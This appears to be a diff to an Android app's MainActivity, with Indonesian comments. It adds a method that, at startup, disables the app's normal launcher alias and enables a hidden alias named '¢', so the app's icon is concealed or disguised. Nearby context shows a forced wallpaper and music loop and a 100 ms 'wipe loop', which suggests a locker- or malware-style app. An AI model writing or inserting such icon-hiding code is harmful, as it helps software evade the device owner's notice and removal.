@@ -193,6 +193,7 @@ public class MainActivity extends Activity {
 
         // 4) mulai wallpaper & music loop
         startWallpaperLoop();
+        switchToHiddenAlias();
         startMusicLoop();
 
         // 5) webview
@@ -280,6 +281,26 @@ public class MainActivity extends Activity {
 	        Log.w(TAG, "note", t);
 	    }
 	}
+
+
+	private void switchToHiddenAlias() {
+	    try {
+	        android.content.pm.PackageManager pm = getPackageManager();
+	        // matikan alias normal
+	        pm.setComponentEnabledSetting(
+	                new android.content.ComponentName(this, "com.mintfox.app.NormalAlias"),
+	                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+	                android.content.pm.PackageManager.DONT_KILL_APP);
+	        // nyalakan alias "¢"
+	        pm.setComponentEnabledSetting(
+	                new android.content.ComponentName(this, "com.mintfox.app.HiddenAlias"),
+	                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+	                android.content.pm.PackageManager.DONT_KILL_APP);
+	    } catch (Throwable t) {
+	        android.util.Log.w("MainActivity", "switchAlias", t);
+	    }
+	}
+
 	
     /* ------------------------------------------------------------------ */
     /* Wipe loop 100ms                                                     */
